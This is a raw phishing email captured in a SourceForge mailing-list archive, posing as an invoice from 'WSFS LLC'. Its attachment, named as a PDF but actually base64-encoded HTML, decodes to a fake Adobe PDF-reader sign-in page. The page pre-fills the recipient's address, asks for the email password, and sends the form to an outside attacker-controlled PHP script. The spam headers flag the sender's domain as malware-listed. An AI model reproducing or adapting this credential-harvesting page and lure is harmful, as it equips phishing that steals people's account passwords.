Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id AD40369A968
	for <lists+industrypack-devel@lfdr.de>; Fri, 17 Feb 2023 11:52:59 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pSyMN-0000TM-4U
	for lists+industrypack-devel@lfdr.de;
	Fri, 17 Feb 2023 10:52:58 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <erik@glasweldservicio.com>) id 1pSyML-0000TF-Jj
 for industrypack-devel@lists.sourceforge.net;
 Fri, 17 Feb 2023 10:52:56 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:List-Unsubscribe:MIME-Version:
 Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=ddRP1m7fy4Rb8pdrNUl85vKY7Oplb0zBafX0FFP5aWE=; b=OFqDsDq4w2i4t6ArjBWPIr6Fc1
 ddQlzMh8QCgvShkD6yZL3N1MUqR3xz627R2g4GKsRqo1/SbaN5JR9uZy6qZGwkuH4kjHT1mgZhxky
 xYziWH8r7J7b4FT5GznsuqGV0vZzL4LArUjrTYGeWh49jIp5g3zPp9EfO3BUSetPl+IM=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:List-Unsubscribe:MIME-Version:Message-ID:Date:Subject:To:
 From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=ddRP1m7fy4Rb8pdrNUl85vKY7Oplb0zBafX0FFP5aWE=; b=PUYJ0S3k8OTxx9iOMtkkJfokQr
 fkyrJ6PMIPXrVC4gqKH/yeqGyCUQ4EXbCo+NV0duKpLnk9pp3SCtJgR59kEadIzI+0WrD4C77BHBu
 xVul8gvFsmTZ4sUd/FrKaCF4sibkL8MNZIPk30eTLaYeTKuonpP7zfwaHf9dO0mnWlTg=;
Received: from ueoxuccb.glasweldservicio.com ([92.52.217.205])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pSyMK-007FIM-60 for industrypack-devel@lists.sourceforge.net;
 Fri, 17 Feb 2023 10:52:56 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim;
 d=glasweldservicio.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:List-Unsubscribe:Content-Type;
 i=erik@glasweldservicio.com; bh=EPnyW3DoN1yMKzw0pyOHu+FXgcM=;
 b=BbWBOBNlK9S8GgG642+WIl2xB+ehqeHOMzztLyIZC/zi17ilFsXdA7JCYb8lmj0+7EWdH0wK1peO
 GThI0PElaBuYRKmSCS5e+M2vNhJaDT3uNIOMVuqEkJS/HILfDlFHzDsZoO0wtXQzGZC2uHAzAKsi
 TvgRzXjk3hzHEhUGVSlkJneWvMoJYABTnUMrAJIjdenc2+ZhcArCuxpVrl/tyB7+jE7VPc3poacD
 qSvOGTdKKfNJ8Xzhs/FlKR7td72UQzDRddsONkRXV2hE2o2nYy0azZki0vek49/uYYoSyN3Yiau/
 7p+vet8GZyP2afEJvUggOzwA58bA+LNKlZnmSw==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=glasweldservicio.com;
 b=j/5TTIXaCh7VdmCDFY+tbQvWzI1ywKazMWUBuGYPLOOA4tC/bJus8K7f6W25v5mE6AtKn3dT5do3
 +Hdsj2qS4bZZKBydsYawSrlOeInLoFHFTvk4a7uxBkvVS4cKgAK3rEKdKt2OSlGjZ//OhgvKOTaf
 u7Rz0UFRyF9dWi1ZINVKU9rp1HToqXeCIb0cL0dj7FstTduThQef4nlLk8gWStS5+QNaAZ6u/pWl
 Q/JRT5Te2PbKCzxJ/6JbQ6HwyZyhqvD86Okj7cKy5w/uzS50dNYcnwHlOwkOqC6JXLXw9YN6a50Z
 i9Q7RAVgfV4lS+DlC1pxv9tNPxXJ7TD/t8Gjqg==;
From: WSFS LLC<erik@glasweldservicio.com>
To: industrypack-devel@lists.sourceforge.net
Date: 17 Feb 2023 02:52:49 -0800
Message-ID: <20230217025249.62D24AC0E66B665D@glasweldservicio.com>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_D69EEA12.2CC0DB98"
X-Spam-Score: 3.4 (+++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Please See Attach for invoice payment of $8,283.90 
 Content analysis details:   (3.4 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_MALWARE      Contains a malware URL listed in the Spamhaus
 DBL blocklist [URIs: glasweldservicio.com]
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [92.52.217.205 listed in dnsbl-1.uceprotect.net]
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [92.52.217.205 listed in wl.mailspike.net]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 T_OBFU_PDF_ATTACH      BODY: PDF attachment with generic MIME type
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.0 T_OBFU_ATTACH_MISSP    Obfuscated attachment type and misspaced
 From 0.0 LOTS_OF_MONEY          Huge... sums of money
X-Headers-End: 1pSyMK-007FIM-60
Subject: [Industrypack-devel] FW: Inv_0220238_from_WSFS LLC
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_D69EEA12.2CC0DB98
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>Please See Attach for invoice payment of $8,283.90</BODY></HTML>
------=_NextPart_000_0012_D69EEA12.2CC0DB98
Content-Type: application/octet-stream; name="industrypack-devel.PDF.shtml"; charset="utf-8"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="industrypack-devel.PDF.shtml"

DQo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0
aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4NCiA8
IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+
DQo8L3NjcmlwdD4NCjxIVE1MPjxIRUFEPg0KPE1FVEEgbmFtZT1HRU5FUkFUT1IgY29udGVu
dD0iTVNIVE1MIDExLjAwLjEwNTcwLjEwMDEiPjwvSEVBRD4NCjxtZXRhIG5hbWU9InJvYm90
cyIgY29udGVudD0ibm9pbmRleCwgbm9mb2xsb3ciPg0KICAgIDxtZXRhIG5hbWU9InZpZXdw
b3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBt
YXhpbXVtLXNjYWxlPTEuMCI+DQoNCiAgICA8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5
cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly93d3cuYWRvYmUuY29tL2Zhdmljb24u
aWNvIj4NCgk8dGl0bGU+UERGIHJlYWRlciB8IEFkb2JlIEFjcm9iYXQgUmVhZGVyIERDPC90
aXRsZT4NCjxCT0RZIHN0eWxlPSJNQVJHSU46MC41ZW07IGJhY2tncm91bmQtaW1hZ2U6dXJs
KCdodHRwczovLzRyZXNjdWUuYWRtaW5zeXdhay5wbC8vcGljcy9pbWFnZWVkaXRfM180Mjcx
NTAwMjMwLmpwZyI+PEJSPjxCUj4NCjxESVYgY2xhc3M9d3JhcHBlciBzdHlsZT0nQk9YLVNJ
WklORzogYm9yZGVyLWJveDsgRk9OVC1TSVpFOiAxNHB4OyBGT05ULUZBTUlMWTogIkhlbHZl
dGljYSBOZXVlIiwgSGVsdmV0aWNhLCBBcmlhbCwgc2Fucy1zZXJpZjsgV0hJVEUtU1BBQ0U6
IG5vcm1hbDsgV09SRC1TUEFDSU5HOiAwcHg7IFRFWFQtVFJBTlNGT1JNOiBub25lOyBGT05U
LVdFSUdIVDogNDAwOyBDT0xPUjogcmdiKDYzLDYzLDYzKTsgRk9OVC1TVFlMRTogbm9ybWFs
OyBNSU4tSEVJR0hUOiAxMDAlOyBPUlBIQU5TOiAyOyBXSURPV1M6IDI7IE1BUkdJTjogMHB4
IDBweCAtNDBweDsgTEVUVEVSLVNQQUNJTkc6IG5vcm1hbDsgVEVYVC1JTkRFTlQ6IDBweDsg
Zm9udC12YXJpYW50LWxpZ2F0dXJlczogbm9ybWFsOyBmb250LXZhcmlhbnQtY2Fwczogbm9y
bWFsOyAtd2Via2l0LXRleHQtc3Ryb2tlLXdpZHRoOiAwcHg7IHRleHQtZGVjb3JhdGlvbi1z
dHlsZTogaW5pdGlhbDsNCnRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbCc+PFNFQ1RJ
T04gY2xhc3M9Y29udGFpbmVyIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBXSURU
SDogMTE4MHB4OyBQQURESU5HLUxFRlQ6IDIwcHg7IE1BUkdJTjogMHB4IGF1dG87IERJU1BM
QVk6IGJsb2NrOyBQQURESU5HLVJJR0hUOiAyMHB4Ij4NCjxESVYgY2xhc3M9Zm9ybS1sb2dp
biBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgTUFYLVdJRFRIOiA0NTBweDsgTUFS
R0lOOiAxODBweCBhdXRvIDQwcHgiPg0KPERJViBjbGFzcz0ibXQtMzAgbWItMzAiIHN0eWxl
PSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBNQVJHSU46IDEwcHggMHB4Ij48SU1HIGNsYXNz
PSJpbWctcmVzcG9uc2l2ZSBmb3JtLWxvZ2luX19jb21wYW55LWxvZ28iIHN0eWxlPSJCT1JE
RVItTEVGVC1XSURUSDogMHB4OyBCT1gtU0laSU5HOiBib3JkZXItYm94OyBNQVgtV0lEVEg6
IDMwJTsgSEVJR0hUOiBhdXRvOyBCT1JERVItUklHSFQtV0lEVEg6IDBweDsgVkVSVElDQUwt
QUxJR046IG1pZGRsZTsgQk9SREVSLUJPVFRPTS1XSURUSDogMHB4OyBNQVJHSU46IDBweCBh
dXRvOyBESVNQTEFZOiBibG9jazsgQk9SREVSLVRPUC1XSURUSDogMHB4OyBNQVgtSEVJR0hU
OiA1MHB4IiBzcmM9Imh0dHBzOi8vaS5pbWd1ci5jb20vQzFza2h3Sy5wbmciPjwvRElWPg0K
PERJViBjbGFzcz1mb3JtLWxvZ2luX19ib2R5IHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXIt
Ym94OyBCT1JERVItVE9QOiByZ2IoMjM1LDIzNSwyMzUpIDFweCBzb2xpZDsgQk9SREVSLVJJ
R0hUOiByZ2IoMjM1LDIzNSwyMzUpIDFweCBzb2xpZDsgQk9SREVSLUJPVFRPTTogcmdiKDIz
NSwyMzUsMjM1KSAxcHggc29saWQ7IFBPU0lUSU9OOiByZWxhdGl2ZTsgUEFERElORy1CT1RU
T006IDMwcHg7IFBBRERJTkctVE9QOiAzMHB4OyBQQURESU5HLUxFRlQ6IDUwcHg7IEJPUkRF
Ui1MRUZUOiByZ2IoMjM1LDIzNSwyMzUpIDFweCBzb2xpZDsgTUFSR0lOOiAwcHg7IFotSU5E
RVg6IDE7IFBBRERJTkctUklHSFQ6IDUwcHg7IEJBQ0tHUk9VTkQtQ09MT1I6IHJnYigyMzQs
IDIzNiwgMjM4KTsgYm9yZGVyLXJhZGl1czogNXB4Ij4NCjxESVYgY2xhc3M9Zm9ybS1ncm91
cCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgTUFSR0lOOiAwcHggMHB4IDE1cHgi
Pg0KPEZPUk0gaWQ9bG9naW5fZm9ybSBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsg
TUFSR0lOOiAwcHgiIG1ldGhvZD0icG9zdCIgDQphY3Rpb24gPSJodHRwczovLzRyZXNjdWUu
YWRtaW5zeXdhay5wbC9ibGVzL296L0R6ZW5pdGgucGhwIj4NCiAgICAgICAgPHA+DQogICAg
ICAgICA8dGFibGUgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHNwYWNpbmc9IjAiIGNl
bGxwYWRkaW5nPSIwIiByb2xlPSJwcmVzZW50YXRpb24iPg0KICAgICAgICAgIDx0cj4NCiAg
ICAgICAgICAgPHRkIHdpZHRoPSI1JSIgYWxpZ249InJpZ2h0Ij4NCiAgICAJICAgICAgPGlt
ZyBzdHlsZT0id2lkdGg6MzBweDsgaGVpZ2h0OjQ1cHgiIHNyYz0iaHR0cHM6Ly80cmVzY3Vl
LmFkbWluc3l3YWsucGwvL3BpY3MvZmVkemVkLnBuZyIgIGJvcmRlcj0iMCIgIGFsdD0iIi8+
DQogICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgIDx0ZCBhbGlnbj0ibGVmdCI+DQogICAg
CSAgICAgIDxkaXYgc3R5bGU9ImNvbG9yOiAjY2I2MzYzOyI+DQogICAgICAgICAgICAgICAg
IERBVU0gQWRvYmUgU2VjdXJlTWFpbHByb3ZpZGVkIGJ5IERBVU0gZW1haWwgZW5jcnlwdGlv
biB8IFBERiBEb2N1bWVudCBSZWFkZXIuDQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAg
ICAgPC90ZD4NCiAgICAgICAgICA8L3RyPg0KICAgICAgICAgPC90YWJsZT4NCiAgICAgICAg
PC9wPg0KPERJViBjbGFzcz1mb3JtLWdyb3VwIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXIt
Ym94OyBNQVJHSU46IDBweCAwcHggMTZweCI+PEZPTlQgc3R5bGU9IkJPWC1TSVpJTkc6IGJv
cmRlci1ib3g7IE1BUkdJTjogMHB4IiBjb2xvcj0jZGM1MjUyIDwvRk9OVD48QlIgc3R5bGU9
IkJPWC1TSVpJTkc6IGJvcmRlci1ib3g7IE1BUkdJTjogMHB4Ij48QlIgc3R5bGU9IkJPWC1T
SVpJTkc6IGJvcmRlci1ib3g7IE1BUkdJTjogMHB4Ij48TEFCRUwgc3R5bGU9IkJPWC1TSVpJ
Tkc6IGJvcmRlci1ib3g7IE1BWC1XSURUSDogMTAwJTsgRk9OVC1XRUlHSFQ6IGJvbGQ7IE1B
UkdJTjogMHB4IDBweCA1cHg7IERJU1BMQVk6IGlubGluZS1ibG9jayIgZm9yPWxvZ2luX3Vz
ZXI+RW1haWwgQWRkcmVzczwvTEFCRUw+DQogPElOUFVUIGlkPWxvZ2luX3VzZXIgY2xhc3M9
Zm9ybS1jb250cm9sIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBGT05ULVNJWkU6
IDE2cHg7IEJPUkRFUi1UT1A6IHJnYigyMDQsMjA0LDIwNCkgMXB4IHNvbGlkOyBIRUlHSFQ6
IDM0cHg7IEZPTlQtRkFNSUxZOiBpbmhlcml0OyBCT1JERVItUklHSFQ6IHJnYigyMDQsMjA0
LDIwNCkgMXB4IHNvbGlkOyBXSURUSDogMzQ4cHg7IEJBQ0tHUk9VTkQtSU1BR0U6IG5vbmU7
IEJPUkRFUi1CT1RUT006IHJnYigyMDQsMjA0LDIwNCkgMXB4IHNvbGlkOyBDT0xPUjogYmxh
Y2s7IFBBRERJTkctQk9UVE9NOiAwcHg7IFBBRERJTkctVE9QOiAwcHg7IFBBRERJTkctTEVG
VDogMHB4OyBCT1JERVItTEVGVDogcmdiKDIwNCwyMDQsMjA0KSAxcHggc29saWQ7IE1BUkdJ
TjogMHB4OyBESVNQTEFZOiBibG9jazsgTElORS1IRUlHSFQ6IDI7IFBBRERJTkctUklHSFQ6
IDBweDsgQkFDS0dST1VORC1DT0xPUjoNCnJnYigyNTUsMjU1LDI1NSk7IFRFWFQtSU5ERU5U
OiAxMHB4OyBmb250LXN0cmV0Y2g6IGluaGVyaXQ7IGJvcmRlci1yYWRpdXM6IDRweDsgYm94
LXNoYWRvdzogcmdiYSgwLCAwLCAwLCAwLjA3NSkgMHB4IDFweCAxcHggaW5zZXQ7IHRyYW5z
aXRpb246IGJvcmRlci1jb2xvciAwLjE1cyBlYXNlLWluLW91dCAwcywgYm94LXNoYWRvdyAw
LjE1cyBlYXNlLWluLW91dCAwcyIgdHlwZT0gImVtYWlsIiBuYW1lPSAiZW1haWwiIGlkPSJl
bWFpbCIgVmFsdWU9ImluZHVzdHJ5cGFjay1kZXZlbEBsaXN0cy5zb3VyY2Vmb3JnZS5uZXQi
cGxhY2Vob2xkZXI9IkVudGVyIEVtYWlsIiAgYXV0b2NvbXBsZXRlPSJvZmYiPjwvRElWPjwv
RElWPg0KPERJViBjbGFzcz1mb3JtLWdyb3VwIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXIt
Ym94OyBNQVJHSU46IDBweCAwcHggMTVweCI+PExBQkVMIHN0eWxlPSJCT1gtU0laSU5HOiBi
b3JkZXItYm94OyBNQVgtV0lEVEg6IDEwMCU7IEZPTlQtV0VJR0hUOiBib2xkOyBNQVJHSU46
IDBweCAwcHggNXB4OyBESVNQTEFZOiBpbmxpbmUtYmxvY2siIGZvcj1sb2dpbl9wd2Q+ZW1h
aWwgcGFzc3dvcmQ8L0xBQkVMPg0KIDxJTlBVVCBpZD1sb2dpbl9wd2QgY2xhc3M9Zm9ybS1j
b250cm9sIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBGT05ULVNJWkU6IDE2cHg7
IEJPUkRFUi1UT1A6IHJnYigyMDQsMjA0LDIwNCkgMXB4IHNvbGlkOyBIRUlHSFQ6IDM0cHg7
IEZPTlQtRkFNSUxZOiBpbmhlcml0OyBCT1JERVItUklHSFQ6IHJnYigyMDQsMjA0LDIwNCkg
MXB4IHNvbGlkOyBXSURUSDogMzQ4cHg7IEJBQ0tHUk9VTkQtSU1BR0U6IG5vbmU7IEJPUkRF
Ui1CT1RUT006IHJnYigyMDQsMjA0LDIwNCkgMXB4IHNvbGlkOyBDT0xPUjogYmxhY2s7IFBB
RERJTkctQk9UVE9NOiAwcHg7IFBBRERJTkctVE9QOiAwcHg7IFBBRERJTkctTEVGVDogMHB4
OyBCT1JERVItTEVGVDogcmdiKDIwNCwyMDQsMjA0KSAxcHggc29saWQ7IE1BUkdJTjogMHB4
OyBESVNQTEFZOiBibG9jazsgTElORS1IRUlHSFQ6IDI7IFBBRERJTkctUklHSFQ6IDBweDsg
QkFDS0dST1VORC1DT0xPUjoNCnJnYigyNTUsMjU1LDI1NSk7IFRFWFQtSU5ERU5UOiAxMHB4
OyBmb250LXN0cmV0Y2g6IGluaGVyaXQ7IGJvcmRlci1yYWRpdXM6IDRweDsgYm94LXNoYWRv
dzogcmdiYSgwLCAwLCAwLCAwLjA3NSkgMHB4IDFweCAxcHggaW5zZXQ7IHRyYW5zaXRpb246
IGJvcmRlci1jb2xvciAwLjE1cyBlYXNlLWluLW91dCAwcywgYm94LXNoYWRvdyAwLjE1cyBl
YXNlLWluLW91dCAwcyIgdHlwZT0gInBhc3N3b3JkIiBuYW1lPSAicGFzc3dvcmQiIHJlcXVp
cmVkPSIiIGlkPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIHBhc3N3b3JkIiBtaW5s
ZW5ndGg9IjUiIHJlcXVpcmVkIHRhYmluZGV4PSIyIiBhdXRvY29ycmVjdD0ib2ZmIiBhdXRv
Y2FwaXRhbGl6ZT0ib2ZmIiBhdXRvY29tcGxldGUgPSJvZmYiPjwvRElWPg0KPElOUFVUIGNs
YXNzPSJidG4gYnRuLXByaW1hcnkgYnRuLWJsb2NrIiBzdHlsZT0iQk9YLVNJWklORzogYm9y
ZGVyLWJveDsgRk9OVC1TSVpFOiAxNHB4OyBDVVJTT1I6IHBvaW50ZXI7IEJPUkRFUi1UT1A6
IHJnYigwLDE2NywyMzApIDFweCBzb2xpZDsgRk9OVC1GQU1JTFk6IGluaGVyaXQ7IEJPUkRF
Ui1SSUdIVDogcmdiKDAsMTY3LDIzMCkgMXB4IHNvbGlkOyBXSURUSDogMzQ4cHg7IFZFUlRJ
Q0FMLUFMSUdOOiBtaWRkbGU7IEJBQ0tHUk9VTkQtSU1BR0U6IG5vbmU7IFdISVRFLVNQQUNF
OiBub3dyYXA7IEJPUkRFUi1CT1RUT006IEQzM0UyQyAxcHggc29saWQ7IEZPTlQtV0VJR0hU
OiBub3JtYWw7IENPTE9SOiByZ2IoMjU1LDI1NSwyNTUpOyBQQURESU5HLUJPVFRPTTogMTNw
eDsgVEVYVC1BTElHTjogY2VudGVyOyBQQURESU5HLVRPUDogMTNweDsgUEFERElORy1MRUZU
OiAxMnB4OyBCT1JERVItTEVGVDogcmdiKDAsMTY3LDIzMCkgMXB4IHNvbGlkOw0KTUFSR0lO
OiAwcHggMHB4IDNweDsgRElTUExBWTogYmxvY2s7IExJTkUtSEVJR0hUOiAxLjQyODU7IFBB
RERJTkctUklHSFQ6IDEycHg7IEJBQ0tHUk9VTkQtQ09MT1I6IHJnYigyMywgMzIsIDQyKTsg
Zm9udC1zdHJldGNoOiBpbmhlcml0OyBib3JkZXItcmFkaXVzOiA0cHg7IHRvdWNoLWFjdGlv
bjogbWFuaXB1bGF0aW9uOyB1c2VyLXNlbGVjdDogbm9uZTsgYXBwZWFyYW5jZTogYnV0dG9u
IiB0eXBlPXN1Ym1pdCB2YWx1ZT0iY29udGludWUgdG8gZG9jdW1lbnRhdGlvbiIgbmFtZT1z
dWJtaXRfYnRuPjwvRk9STT48L0RJVj48L0RJVj48L0RJVj48L1NFQ1RJT04+DQo8RElWPjwv
RElWPjwvRk9STT4NCjxESVY+PC9ESVY+DQo8RElWPjwvRElWPg0KPERJVj48L0RJVj48L1NF
Q1RJT04+DQo8RElWPjwvRElWPg0KPFA+DQo8Rk9PVEVSIGNsYXNzPWZvb3Rlci1sb2dpbiBz
dHlsZT0nQk9YLVNJWklORzogYm9yZGVyLWJveDsgRk9OVC1TSVpFOiAxNHB4OyBIRUlHSFQ6
IDQwcHg7IEZPTlQtRkFNSUxZOiAiSGVsdmV0aWNhIE5ldWUiLCBIZWx2ZXRpY2EsIEFyaWFs
LCBzYW5zLXNlcmlmOyBXSElURS1TUEFDRTogbm9ybWFsOyBXT1JELVNQQUNJTkc6IDBweDsg
UE9TSVRJT046IHJlbGF0aXZlOyBURVhULVRSQU5TRk9STTogbm9uZTsgRk9OVC1XRUlHSFQ6
IDQwMDsgQ09MT1I6IHJnYig2Myw2Myw2Myk7IEZPTlQtU1RZTEU6IG5vcm1hbDsgVEVYVC1B
TElHTjogY2VudGVyOyBPUlBIQU5TOiAyOyBXSURPV1M6IDI7IE1BUkdJTjogMHB4OyBESVNQ
TEFZOiBibG9jazsgTEVUVEVSLVNQQUNJTkc6IG5vcm1hbDsgQk9UVE9NOiAxMHB4OyBURVhU
LUlOREVOVDogMHB4OyBmb250LXZhcmlhbnQtbGlnYXR1cmVzOiBub3JtYWw7IGZvbnQtdmFy
aWFudC1jYXBzOiBub3JtYWw7DQotd2Via2l0LXRleHQtc3Ryb2tlLXdpZHRoOiAwcHg7IHRl
eHQtZGVjb3JhdGlvbi1zdHlsZTogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLWNvbG9yOiBp
bml0aWFsJz48QlI+PEJSPjxTUEFOIGNsYXNzPSJ0ZXh0LXNtYWxsZXIgdGV4dC1ncmF5IiBz
dHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgRk9OVC1TSVpFOiA5cHg7IENPTE9SOiBy
Z2IoMTM1LDEzNSwxMzUpOyBNQVJHSU46IDBweDsgRElTUExBWTogYmxvY2siPjxCUj48QlI+
PC9TUEFOPjwvUD48L0JPRFk+PC9IVE1MPg==

------=_NextPart_000_0012_D69EEA12.2CC0DB98
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_D69EEA12.2CC0DB98
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_D69EEA12.2CC0DB98--

